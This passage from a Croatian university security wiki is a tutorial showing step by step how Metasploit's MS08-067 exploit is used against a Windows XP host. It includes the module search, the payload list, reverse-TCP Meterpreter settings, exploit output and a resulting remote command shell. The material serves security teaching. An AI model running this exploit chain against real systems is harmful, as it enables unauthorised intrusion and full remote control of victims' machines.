|   SMBv2 DoS (CVE-2009-3103): CHECK DISABLED (add '--script-args=unsafe=1' to run)
|   MS06-025: CHECK DISABLED (remove 'safe=1' argument to run)
|_  MS07-029: CHECK DISABLED (remove 'safe=1' argument to run)

Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 7.81 seconds
</pre>
<p>Iz pretrage ranjivosti možemo vidjeti koji su portovi otvoreni, o kojem se operacijskom sustavu radi i koje su ranjivosti. Kako nam skeniranje ranjivosti pokazuje da je sustav ranjiv na MS08-067, pokušat ćemo iskoristiti tu ranjivost kako bi ušli u sustav. Prvo ćemo pretražiti module koji sadrže MS08-067. To ćemo napraviti jednostavnom naredbom:
</p>
<pre>
msf &gt; search MS08-067
</pre>
<p>Rezultat pretrage je:
</p>
<pre>
Matching Modules
================

   Name                                 Disclosure Date  Rank   Description
   ----                                 ---------------  ----   -----------
   exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Microsoft Server Service Relative Path Stack Corruption	
</pre>
<p>S obzirom da smo dobili samo jedan rezultat, eksploataciju ćemo započeti naredbom:
</p>
<pre>
use  exploti/windows/smb/ms08_067_netapi 
</pre>
<p>Kada smo odabrali eksploataciju, možemo provjeriti koji su sve payloadovi dostupni za ovu eksploataciju. To ćemo neapraviti naredbom:
</p>
<pre>
exploit(ms08_067_netapi) &gt; show payloads
</pre>
<p>Rezultat ove naredbe je popis svih payloada koje je moguće iskoristiti u ovoj eksploataciji:
</p>
<pre>
Compatible Payloads
===================

   Name                                             Disclosure Date  Rank    Description
   ----                                             ---------------  ----    -----------
   generic/custom                                                    normal  Custom Payload
   generic/debug_trap                                                normal  Generic x86 Debug Trap
   generic/shell_bind_tcp                                            normal  Generic Command Shell, Bind TCP Inline
   generic/shell_reverse_tcp                                         normal  Generic Command Shell, Reverse TCP Inline
   generic/tight_loop                                                normal  Generic x86 Tight Loop
   windows/adduser                                                   normal  Windows Execute net user /ADD
   windows/dllinject/bind_ipv6_tcp                                   normal  Reflective Dll Injection, Bind TCP Stager (IPv6)
   windows/dllinject/bind_nonx_tcp                                   normal  Reflective Dll Injection, Bind TCP Stager (No NX or Win7)
   windows/dllinject/bind_tcp                                        normal  Reflective Dll Injection, Bind TCP Stager
   windows/dllinject/reverse_http                                    normal  Reflective Dll Injection, Reverse HTTP Stager
   windows/dllinject/reverse_ipv6_http                               normal  Reflective Dll Injection, Reverse HTTP Stager (IPv6)
   windows/dllinject/reverse_ipv6_tcp                                normal  Reflective Dll Injection, Reverse TCP Stager (IPv6)
   windows/dllinject/reverse_nonx_tcp                                normal  Reflective Dll Injection, Reverse TCP Stager (No NX or Win7)
   windows/dllinject/reverse_ord_tcp                                 normal  Reflective Dll Injection, Reverse Ordinal TCP Stager (No NX or Win7)
   windows/dllinject/reverse_tcp                                     normal  Reflective Dll Injection, Reverse TCP Stager
   windows/dllinject/reverse_tcp_allports                            normal  Reflective Dll Injection, Reverse All-Port TCP Stager
   windows/dllinject/reverse_tcp_dns                                 normal  Reflective Dll Injection, Reverse TCP Stager (DNS)
   windows/download_exec                                             normal  Windows Executable Download and Execute
   windows/exec                                                      normal  Windows Execute Command
   windows/loadlibrary                                               normal  Windows LoadLibrary Path
   windows/messagebox                                                normal  Windows MessageBox
   windows/meterpreter/bind_ipv6_tcp                                 normal  Windows Meterpreter (Reflective Injection), Bind TCP Stager (IPv6)
   windows/meterpreter/bind_nonx_tcp                                 normal  Windows Meterpreter (Reflective Injection), Bind TCP Stager (No NX or Win7)
   windows/meterpreter/bind_tcp                                      normal  Windows Meterpreter (Reflective Injection), Bind TCP Stager
   windows/meterpreter/reverse_http                                  normal  Windows Meterpreter (Reflective Injection), Reverse HTTP Stager
   windows/meterpreter/reverse_https                                 normal  Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager
   windows/meterpreter/reverse_ipv6_http                             normal  Windows Meterpreter (Reflective Injection), Reverse HTTP Stager (IPv6)
   windows/meterpreter/reverse_ipv6_https                            normal  Windows Meterpreter (Reflective Injection), Reverse HTTPS Stager (IPv6)
   windows/meterpreter/reverse_ipv6_tcp                              normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (IPv6)
   windows/meterpreter/reverse_nonx_tcp                              normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (No NX or Win7)
   windows/meterpreter/reverse_ord_tcp                               normal  Windows Meterpreter (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7)
   windows/meterpreter/reverse_tcp                                   normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager
   windows/meterpreter/reverse_tcp_allports                          normal  Windows Meterpreter (Reflective Injection), Reverse All-Port TCP Stager
   windows/meterpreter/reverse_tcp_dns                               normal  Windows Meterpreter (Reflective Injection), Reverse TCP Stager (DNS)
   windows/metsvc_bind_tcp                                           normal  Windows Meterpreter Service, Bind TCP
   windows/metsvc_reverse_tcp                                        normal  Windows Meterpreter Service, Reverse TCP Inline
   windows/patchupdllinject/bind_ipv6_tcp                            normal  Windows Inject DLL, Bind TCP Stager (IPv6)
   windows/patchupdllinject/bind_nonx_tcp                            normal  Windows Inject DLL, Bind TCP Stager (No NX or Win7)
   windows/patchupdllinject/bind_tcp                                 normal  Windows Inject DLL, Bind TCP Stager
   windows/patchupdllinject/reverse_ipv6_tcp                         normal  Windows Inject DLL, Reverse TCP Stager (IPv6)
   windows/patchupdllinject/reverse_nonx_tcp                         normal  Windows Inject DLL, Reverse TCP Stager (No NX or Win7)
   windows/patchupdllinject/reverse_ord_tcp                          normal  Windows Inject DLL, Reverse Ordinal TCP Stager (No NX or Win7)
   windows/patchupdllinject/reverse_tcp                              normal  Windows Inject DLL, Reverse TCP Stager
   windows/patchupdllinject/reverse_tcp_allports                     normal  Windows Inject DLL, Reverse All-Port TCP Stager
   windows/patchupdllinject/reverse_tcp_dns                          normal  Windows Inject DLL, Reverse TCP Stager (DNS)
   windows/patchupmeterpreter/bind_ipv6_tcp                          normal  Windows Meterpreter (skape/jt injection), Bind TCP Stager (IPv6)
   windows/patchupmeterpreter/bind_nonx_tcp                          normal  Windows Meterpreter (skape/jt injection), Bind TCP Stager (No NX or Win7)
   windows/patchupmeterpreter/bind_tcp                               normal  Windows Meterpreter (skape/jt injection), Bind TCP Stager
   windows/patchupmeterpreter/reverse_ipv6_tcp                       normal  Windows Meterpreter (skape/jt injection), Reverse TCP Stager (IPv6)
   windows/patchupmeterpreter/reverse_nonx_tcp                       normal  Windows Meterpreter (skape/jt injection), Reverse TCP Stager (No NX or Win7)
   windows/patchupmeterpreter/reverse_ord_tcp                        normal  Windows Meterpreter (skape/jt injection), Reverse Ordinal TCP Stager (No NX or Win7)
   windows/patchupmeterpreter/reverse_tcp                            normal  Windows Meterpreter (skape/jt injection), Reverse TCP Stager
   windows/patchupmeterpreter/reverse_tcp_allports                   normal  Windows Meterpreter (skape/jt injection), Reverse All-Port TCP Stager
   windows/patchupmeterpreter/reverse_tcp_dns                        normal  Windows Meterpreter (skape/jt injection), Reverse TCP Stager (DNS)
   windows/shell/bind_ipv6_tcp                                       normal  Windows Command Shell, Bind TCP Stager (IPv6)
   windows/shell/bind_nonx_tcp                                       normal  Windows Command Shell, Bind TCP Stager (No NX or Win7)
   windows/shell/bind_tcp                                            normal  Windows Command Shell, Bind TCP Stager
   windows/shell/reverse_http                                        normal  Windows Command Shell, Reverse HTTP Stager
   windows/shell/reverse_ipv6_http                                   normal  Windows Command Shell, Reverse HTTP Stager (IPv6)
   windows/shell/reverse_ipv6_tcp                                    normal  Windows Command Shell, Reverse TCP Stager (IPv6)
   windows/shell/reverse_nonx_tcp                                    normal  Windows Command Shell, Reverse TCP Stager (No NX or Win7)
   windows/shell/reverse_ord_tcp                                     normal  Windows Command Shell, Reverse Ordinal TCP Stager (No NX or Win7)
   windows/shell/reverse_tcp                                         normal  Windows Command Shell, Reverse TCP Stager
   windows/shell/reverse_tcp_allports                                normal  Windows Command Shell, Reverse All-Port TCP Stager
   windows/shell/reverse_tcp_dns                                     normal  Windows Command Shell, Reverse TCP Stager (DNS)
   windows/shell_bind_tcp                                            normal  Windows Command Shell, Bind TCP Inline
   windows/shell_reverse_tcp                                         normal  Windows Command Shell, Reverse TCP Inline
   windows/speak_pwned                                               normal  Windows Speech API - Say &quot;You Got Pwned!&quot;
   windows/upexec/bind_ipv6_tcp                                      normal  Windows Upload/Execute, Bind TCP Stager (IPv6)
   windows/upexec/bind_nonx_tcp                                      normal  Windows Upload/Execute, Bind TCP Stager (No NX or Win7)
   windows/upexec/bind_tcp                                           normal  Windows Upload/Execute, Bind TCP Stager
   windows/upexec/reverse_http                                       normal  Windows Upload/Execute, Reverse HTTP Stager
   windows/upexec/reverse_ipv6_http                                  normal  Windows Upload/Execute, Reverse HTTP Stager (IPv6)
   windows/upexec/reverse_ipv6_tcp                                   normal  Windows Upload/Execute, Reverse TCP Stager (IPv6)
   windows/upexec/reverse_nonx_tcp                                   normal  Windows Upload/Execute, Reverse TCP Stager (No NX or Win7)
   windows/upexec/reverse_ord_tcp                                    normal  Windows Upload/Execute, Reverse Ordinal TCP Stager (No NX or Win7)
   windows/upexec/reverse_tcp                                        normal  Windows Upload/Execute, Reverse TCP Stager
   windows/upexec/reverse_tcp_allports                               normal  Windows Upload/Execute, Reverse All-Port TCP Stager
   windows/upexec/reverse_tcp_dns                                    normal  Windows Upload/Execute, Reverse TCP Stager (DNS)
   windows/vncinject/bind_ipv6_tcp                                   normal  VNC Server (Reflective Injection), Bind TCP Stager (IPv6)
   windows/vncinject/bind_nonx_tcp                                   normal  VNC Server (Reflective Injection), Bind TCP Stager (No NX or Win7)
   windows/vncinject/bind_tcp                                        normal  VNC Server (Reflective Injection), Bind TCP Stager
   windows/vncinject/reverse_http                                    normal  VNC Server (Reflective Injection), Reverse HTTP Stager
   windows/vncinject/reverse_ipv6_http                               normal  VNC Server (Reflective Injection), Reverse HTTP Stager (IPv6)
   windows/vncinject/reverse_ipv6_tcp                                normal  VNC Server (Reflective Injection), Reverse TCP Stager (IPv6)
   windows/vncinject/reverse_nonx_tcp                                normal  VNC Server (Reflective Injection), Reverse TCP Stager (No NX or Win7)
   windows/vncinject/reverse_ord_tcp                                 normal  VNC Server (Reflective Injection), Reverse Ordinal TCP Stager (No NX or Win7)
   windows/vncinject/reverse_tcp                                     normal  VNC Server (Reflective Injection), Reverse TCP Stager
   windows/vncinject/reverse_tcp_allports                            normal  VNC Server (Reflective Injection), Reverse All-Port TCP Stager
   windows/vncinject/reverse_tcp_dns                                 normal  VNC Server (Reflective Injection), Reverse TCP Stager (DNS)

</pre>
<p>Da bismo odabrali <i>payload</i>, potrebno je iskoristiti naredbu <i>set payload</i>. Uz naredbu treba upisati i potpuno ime <i>payloada</i> U ovom primjeru će biti korišten <i>windows/meterpreter/reverse_tcp</i>:
</p>
<pre>
set payload  windows/meterpreter/reverse_tcp 
</pre>
<p>Kako bi saznali što sve trebamo podesiti za izvođenje eksploatacije trebamo pozvati naredbu <i>show options</i>. Za ovaj primjer dobivamo sljedeći rezultat:
</p>
<pre>

Module options (exploit/windows/smb/ms08_067_netapi):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   RHOST                     yes       The target address
   RPORT    445              yes       Set the SMB service port
   SMBPIPE  BROWSER          yes       The pipe name to use (BROWSER, SRVSVC)


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique: seh, thread, none, process
   LHOST                      yes       The listen address
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic Targeting
</pre>
<p>Sada je potrebno postaviti vrijednosti za određene opcije. Potrebno je postaviti vrijednosti RHOST (IP adresa mete), LHOST (IP adresa napadača) i LPORT (port napadača). Sve vrijednosti postavljamo naredbom <i>set</i>.
</p>
<pre>
exploit(ms08_067_netapi) &gt; set RHOST 10.211.55.6
  RHOST =&gt; 10.211.55.6
exploit(ms08_067_netapi) &gt; set LHOST 192.168.1.6
  LHOST =&gt; 192.168.1.6
exploit(ms08_067_netapi) &gt; set LPORT 9999
   LPORT =&gt; 9999
</pre>
<p>Postavljanje IP adrese i porta napadača je vrlo važno za uspostavljanje <i>sesije</i> između računala napadača i napadnutog računala. Nakon što su postavljene sve postavke potrebne za eksploataciju, potrebno je samo još pokrenuti eksploataciju naredbom <i>exploit</i>. Pokretanjem naredbe se dobije sljedeći rezultat:
</p>
<pre>
[*] Started reverse handler on 192.168.1.6:9999 
[*] Automatically detecting the target...
[*] Fingerprint: Windows XP - Service Pack 2 - lang:English
[*] Selected Target: Windows XP SP2 English (AlwaysOn NX)
[*] Attempting to trigger the vulnerability...
[*] Sending stage (752128 bytes) to 192.168.1.6
[*] Meterpreter session 1 opened (192.168.1.6:9999 -&gt; 192.168.1.6:59737) at Mon Jan 02 23:55:54 +0100 2012
</pre>
<p>Time je uspostavljena sesija između računala napadača i napadnutog računala. Sada naredbom sessions -i 1uspostavljamo interakciju između računala. Tada nam se otvara Metapreter. Metapreter je payload koji nam omogućuje mnoge post-ecksploatacijske funkcionalnosti. Više o Metapreteru je moguće saznati na <a href="http://dev.metasploit.com/documents/meterpreter.pdf" class="external free" rel="nofollow">http://dev.metasploit.com/documents/meterpreter.pdf</a>. Ovdje ćemo ga iskoristiti kako bi mogli pristupiti <i>command shell</i>-u napadnutog operacijskog sustava. Iskoristit ćemo jednostavnu naredbu <i>shell</i>. 
</p>
<pre>
meterpreter &gt; shell
Process 3064 created.
Channel 1 created.
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS&gt;

</pre>
<p>Vidimo kako nam Metapreter omogućuje izravan pristup svim datotekama napadnutog računala.
</p><p>Shell nije jedina naredba koju možemo koristiti u Metapreteru. Pomoću njega možemo napravitit <i>download</i> datoteka s napadnutog računala, možemo izvršavati programe, "ubijati" procese, resetirati računalo. Drugim riječima imamo potpunu kontrolu nad računalom. Lista naredbi metapretera nalazi se na <a href="http://en.wikibooks.org/wiki/Metasploit/MeterpreterClient#download" class="external free" rel="nofollow">http://en.wikibooks.org/wiki/Metasploit/MeterpreterClient#download</a>.
</p><p>--<a href="http://security.foi.hr/wiki/index.php?title=Suradnik:Tin.komlinovic&amp;action=edit&amp;redlink=1" class="new" title="Suradnik:Tin.komlinovic (stranica ne postoji)">Tin.komlinovic</a> 00:47, 3. siječnja 2012. (CET)
</p>
<!-- 
NewPP limit report
Preprocessor node count: 110/1000000
Post-expand include size: 0/2097152 bytes
Template argument size: 0/2097152 bytes
Expensive parser function count: 0/100
-->

<!-- Saved in parser cache with key sisds:pcache:idhash:41-0!*!0!!hr!2!edit=0 and timestamp 20190203204039 -->
<div class="printfooter">
Dobavljeno iz "<a href="Eksploatacijski_frameworkovi.html">http://security.foi.hr/wiki/index.php/Eksploatacijski_frameworkovi</a>"</div>
				<!-- /bodytext -->
								<!-- catlinks -->
				<div id='catlinks' class='catlinks catlinks-allhidden'></div>				<!-- /catlinks -->
												<div class="visualClear"></div>
			</div>
			<!-- /bodyContent -->
		</div>
		<!-- /content -->
		<!-- header -->
		<div id="mw-head" class="noprint">
			
<!-- 0 -->
<div id="p-personal" class="">
	<h5>Osobni alati</h5>
	<ul>
					<li  id="pt-login"><a href="http://security.foi.hr/wiki/index.php?title=Posebno:Prijava&amp;returnto=Eksploatacijski_frameworkovi" title="Predlažemo Vam da se prijavite, ali nije obvezno. [o]" accesskey="o">Prijavi se</a></li>
			</ul>
</div>

<!-- /0 -->
			<div id="left-navigation">
				
<!-- 0 -->
<div id="p-namespaces" class="vectorTabs">
	<h5>Imenski prostori</h5>
	<ul>
					<li  id="ca-nstab-main" class="selected"><span><a href="Eksploatacijski_frameworkovi.html"  title="Pogledaj sadržaj [c]" accesskey="c">Članak</a></span></li>
					<li  id="ca-talk" class="new"><span><a href="http://security.foi.hr/wiki/index.php?title=Razgovor:Eksploatacijski_frameworkovi&amp;action=edit&amp;redlink=1"  title="Razgovor o stranici [t]" accesskey="t">Razgovor</a></span></li>
			</ul>
</div>

<!-- /0 -->

<!-- 1 -->
<div id="p-variants" class="vectorMenu emptyPortlet">
		<h5><span>Inačice</span><a href="Eksploatacijski_frameworkovi.html#"></a></h5>
	<div class="menu">
		<ul>
					</ul>
	</div>
</div>

<!-- /1 -->
			</div>
			<div id="right-navigation">
				
<!-- 0 -->
<div id="p-views" class="vectorTabs">
	<h5>Pogledi</h5>
	<ul>
					<li id="ca-view" class="selected"><span><a href="Eksploatacijski_frameworkovi.html" >Čitaj</a></span></li>
					<li id="ca-viewsource"><span><a href="http://security.foi.hr/wiki/index.php?title=Eksploatacijski_frameworkovi&amp;action=edit"  title="Ova stranica je zaštićena. Možete pogledati izvorni kod. [e]" accesskey="e">Vidi izvor</a></span></li>
					<li id="ca-history" class="collapsible "><span><a href="http://security.foi.hr/wiki/index.php?title=Eksploatacijski_frameworkovi&amp;action=history"  title="Ranije izmjene na ovoj stranici. [h]" accesskey="h">Vidi stare izmjene</a></span></li>
			</ul>
</div>

<!-- /0 -->

<!-- 1 -->
<div id="p-cactions" class="vectorMenu emptyPortlet">
	<h5><span>Radnje</span><a href="Eksploatacijski_frameworkovi.html#"></a></h5>
	<div class="menu">
		<ul>
					</ul>
	</div>
</div>

<!-- /1 -->

<!-- 2 -->
<div id="p-search">
	<h5><label for="searchInput">Traži</label></h5>
	<form action="http://security.foi.hr/wiki/index.php" id="searchform">
		<input type='hidden' name="title" value="Posebno:Traži"/>
				<input id="searchInput" name="search" type="text"  title="Pretraži ovaj wiki [f]" accesskey="f"  value="" />
		<input type='submit' name="go" class="searchButton" id="searchGoButton"	value="Kreni" title="Idi na stranicu s ovim imenom ako ona postoji" />
		<input type="submit" name="fulltext" class="searchButton" id="mw-searchButton" value="Traži" title="Traži ovaj tekst na svim stranicama" />
			</form>
</div>

<!-- /2 -->
			</div>
		</div>
		<!-- /header -->
		<!-- panel -->
			<div id="mw-panel" class="noprint">
				<!-- logo -->
					<div id="p-logo"><a style="background-image: url(../../images/osslogo.png);" href="../../wiki.html"  title="Glavna stranica"></a></div>
				<!-- /logo -->
				
<!-- navigation -->
<div class="portal" id='p-navigation'>
	<h5>Orijentacija</h5>
	<div class="body">
				<ul>
					<li id="n-mainpage-description"><a href="../../wiki.html" title="Posjeti glavnu stranicu [z]" accesskey="z">Glavna stranica</a></li>
					<li id="n-portal"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Portal_zajednice" title="O projektu, što možete učiniti, gdje je što">Portal zajednice</a></li>
					<li id="n-currentevents"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Novosti" title="O trenutačnim događajima">Aktualno</a></li>
					<li id="n-recentchanges"><a href="./Posebno:Nedavne_promjene.html" title="Popis nedavnih promjena u wikiju. [r]" accesskey="r">Nedavne promjene</a></li>
					<li id="n-randompage"><a href="./Posebno:Slučajna_stranica.html" title="Učitaj slučajnu stranicu [x]" accesskey="x">Slučajna stranica</a></li>
					<li id="n-help"><a href="./Pomoć:Pomoć.html" title="Mjesto za pomoć suradnicima.">Pomoć</a></li>
				</ul>
			</div>
</div>

<!-- /navigation -->

<!-- SEARCH -->

<!-- /SEARCH -->

<!-- TOOLBOX -->
<div class="portal" id="p-tb">
	<h5>Traka s alatima</h5>
	<div class="body">
		<ul>
					<li id="t-whatlinkshere"><a href="http://security.foi.hr/wiki/index.php/Posebno:%C5%A0to_vodi_ovamo/Eksploatacijski_frameworkovi" title="Popis svih stranica koje sadrže poveznice ovamo [j]" accesskey="j">Što vodi ovamo</a></li>
						<li id="t-recentchangeslinked"><a href="http://security.foi.hr/wiki/index.php/Posebno:Povezane_promjene/Eksploatacijski_frameworkovi" title="Nedavne promjene na stranicama na koje vode ovdašnje poveznice [k]" accesskey="k">Povezane stranice</a></li>
																																										<li id="t-specialpages"><a href="./Posebno:Posebne_stranice.html" title="Popis posebnih stranica [q]" accesskey="q">Posebne stranice</a></li>
									<li id="t-print"><a href="http://security.foi.hr/wiki/index.php?title=Eksploatacijski_frameworkovi&amp;printable=yes" rel="alternate" title="Verzija za ispis ove stranice [p]" accesskey="p">Verzija za ispis</a></li>
						<li id="t-permalink"><a href="http://security.foi.hr/wiki/index.php?title=Eksploatacijski_frameworkovi&amp;oldid=9323" title="Trajna poveznica na ovu verziju stranice">Trajna poveznica</a></li>
						</ul>
	</div>
</div>

<!-- /TOOLBOX -->

<!-- LANGUAGES -->

<!-- /LANGUAGES -->
			</div>
		<!-- /panel -->
		<!-- footer -->
		<div id="footer">
											<ul id="footer-info">
																	<li id="footer-info-lastmod"> Datum zadnje promjene na ovoj stranici: 21:53, 6. travnja 2012.</li>
																							<li id="footer-info-viewcount">Ova stranica je pogledana 39.697 puta.</li>
																							<li id="footer-info-copyright">Sadržaji se koriste u skladu s <a href="http://creativecommons.org/licenses/by-sa/3.0/" class="external ">Creative Commons Attribution Share Alike</a>.</li>
															</ul>
															<ul id="footer-places">
																	<li id="footer-places-privacy"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:Za%C5%A1tita_privatnosti" title="SIS Wiki:Zaštita privatnosti">Zaštita privatnosti</a></li>
																							<li id="footer-places-about"><a href="./SIS_Wiki:O_projektu_SIS_Wiki.html" title="SIS Wiki:O projektu SIS Wiki">O projektu SIS Wiki</a></li>
																							<li id="footer-places-disclaimer"><a href="http://security.foi.hr/wiki/index.php/SIS_Wiki:General_disclaimer" title="SIS Wiki:General disclaimer">Odricanje od odgovornosti</a></li>
															</ul>
											<ul id="footer-icons" class="noprint">
					<li id="footer-copyrightico">
						<a href="http://creativecommons.org/licenses/by-sa/3.0/"><img src="../skins/common/images/cc-by-sa.png" alt="Creative Commons Attribution Share Alike" width="88" height="31" /></a>
					</li>
					<li id="footer-poweredbyico">
						<a href="http://www.mediawiki.org/"><img src="../skins/common/images/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" width="88" height="31" /></a>
					</li>
				</ul>
						<div style="clear:both"></div>
		</div>
		<!-- /footer -->
		
<script src="../load.php%3Fdebug=false&amp;lang=hr&amp;modules=startup&amp;only=scripts&amp;skin=vector&amp;*"></script>
<script>if ( window.mediaWiki ) {
	mediaWiki.config.set({"wgCanonicalNamespace": "", "wgCanonicalSpecialPageName": false, "wgNamespaceNumber": 0, "wgPageName": "Eksploatacijski_frameworkovi", "wgTitle": "Eksploatacijski frameworkovi", "wgAction": "view", "wgArticleId": 41, "wgIsArticle": true, "wgUserName": null, "wgUserGroups": ["*"], "wgCurRevisionId": 9323, "wgCategories": [], "wgBreakFrames": false, "wgRestrictionEdit": [], "wgRestrictionMove": []});
}
</script>
<script>if ( window.mediaWiki ) {
	mediaWiki.loader.load(["mediawiki.util", "mediawiki.legacy.wikibits", "mediawiki.legacy.ajax"]);
	mediaWiki.loader.go();
}
</script>

<script>if ( window.mediaWiki ) {
	mediaWiki.user.options.set({"ccmeonemails":0,"cols":80,"contextchars":50,"contextlines":5,"date":"default","diffonly":0,"disablemail":0,"disablesuggest":0,"editfont":"default","editondblclick":0,"editsection":1,"editsectiononrightclick":0,"enotifminoredits":0,"enotifrevealaddr":0,"enotifusertalkpages":1,"enotifwatchlistpages":0,"extendwatchlist":0,"externaldiff":0,"externaleditor":0,"fancysig":0,"forceeditsummary":0,"gender":"unknown","hideminor":0,"hidepatrolled":0,"highlightbroken":1,"imagesize":2,"justify":0,"math":1,"minordefault":0,"newpageshidepatrolled":0,"nocache":0,"noconvertlink":0,"norollbackdiff":0,"numberheadings":0,"previewonfirst":0,"previewontop":1,"quickbar":1,"rcdays":7,"rclimit":50,"rememberpassword":0,"rows":25,"searchlimit":20,"showhiddencats":0,"showjumplinks":1,"shownumberswatching":1,"showtoc":1,"showtoolbar":1,"skin":"vector","stubthreshold":0,"thumbsize":2,"underline":2,"uselivepreview":0,"usenewrc":0,"watchcreations":0,"watchdefault":0,"watchdeletion":0,
	"watchlistdays":3,"watchlisthideanons":0,"watchlisthidebots":0,"watchlisthideliu":0,"watchlisthideminor":0,"watchlisthideown":0,"watchlisthidepatrolled":0,"watchmoves":0,"wllimit":250,"variant":"hr","language":"hr","searchNs0":true,"searchNs1":false,"searchNs2":false,"searchNs3":false,"searchNs4":false,"searchNs5":false,"searchNs6":false,"searchNs7":false,"searchNs8":false,"searchNs9":false,"searchNs10":false,"searchNs11":false,"searchNs12":false,"searchNs13":false,"searchNs14":false,"searchNs15":false});;mediaWiki.loader.state({"user.options":"ready"});
}
</script>		<!-- fixalpha -->
		<script type="text/javascript"> if ( window.isMSIE55 ) fixalpha(); </script>
		<!-- /fixalpha -->
		<!-- Served in 0.465 secs. -->			</body>
</html>
